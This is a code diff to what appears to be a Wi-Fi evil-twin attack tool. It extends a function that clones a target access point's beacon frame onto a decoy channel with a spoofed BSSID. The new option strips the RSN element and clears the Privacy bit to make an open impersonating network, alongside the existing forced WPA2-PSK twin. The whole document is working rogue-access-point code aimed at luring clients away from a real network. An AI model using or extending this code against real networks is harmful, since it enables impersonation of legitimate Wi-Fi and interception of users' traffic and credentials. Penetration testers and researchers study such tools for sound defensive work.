@@ -63,8 +63,10 @@ def _vht_op_to_20mhz(elem: bytes) -> bytes:
     return elem[:2] + bytes(body)
 
 
-def beacon_clone(real_beacon: bytes, decoy_channel: int, bssid: Optional[bytes] = None) -> bytes:
-    """The target's beacon rewritten to a WPA2-PSK twin. ``bssid`` rewrites Addr2/Addr3."""
+def beacon_clone(real_beacon: bytes, decoy_channel: int, bssid: Optional[bytes] = None,
+                 secured: bool = True) -> bytes:
+    """The target's beacon rewritten to a WPA2-PSK twin, or (``secured=False``) an open one: RSN
+    IE dropped and the Privacy bit cleared. ``bssid`` rewrites Addr2/Addr3."""
     if len(real_beacon) < _BEACON_HEAD:
         raise ValueError(f"beacon too short to rewrite: {len(real_beacon)} bytes")
     head = bytearray(real_beacon[:_BEACON_HEAD])
@@ -72,6 +74,9 @@ def beacon_clone(real_beacon: bytes, decoy_channel: int, bssid: Optional[bytes] 
     if bssid is not None:
         head[10:16] = bssid          # Addr2 (SA)
         head[16:22] = bssid          # Addr3 (BSSID)
+    if not secured:
+        cap = struct.unpack_from("<H", head, 34)[0] & ~_CAP_PRIVACY
+        struct.pack_into("<H", head, 34, cap)
     tags = real_beacon[_BEACON_HEAD:]
     kept = bytearray()
     ptr = 0
@@ -82,7 +87,9 @@ def beacon_clone(real_beacon: bytes, decoy_channel: int, bssid: Optional[bytes] 
         elem = tags[ptr:end]
         tag_id = tags[ptr]
         if tag_id == _ELEMID_RSN:
-            kept += force_psk_akm(bytes(elem)) or GENERIC_RSN_IE
+            if secured:
+                kept += force_psk_akm(bytes(elem)) or GENERIC_RSN_IE
+            # else: drop it entirely -- an open twin advertises no RSN at all
         elif tag_id == _ELEMID_DS:
             kept += ds_param_ie(decoy_channel)
         elif tag_id == _ELEMID_HT_OP:
